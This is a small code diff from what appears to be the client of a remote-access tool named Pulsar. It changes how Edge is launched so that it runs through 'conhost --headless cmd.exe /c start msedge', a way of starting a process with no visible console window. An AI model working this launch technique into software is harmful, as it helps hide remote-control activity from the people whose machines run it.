@@ -318,6 +318,12 @@ namespace Pulsar.Client.Messages
                 Thread.Sleep(1000);
                 
                 Debug.WriteLine($"Direct starting browser: {executablePath}");
+
+                if (name == "Edge")
+                {
+                    executablePath = "conhost --headless cmd.exe /c start msedge";
+                }
+
                 ProcessHandler.CreateProc(executablePath);
                 return;
             }
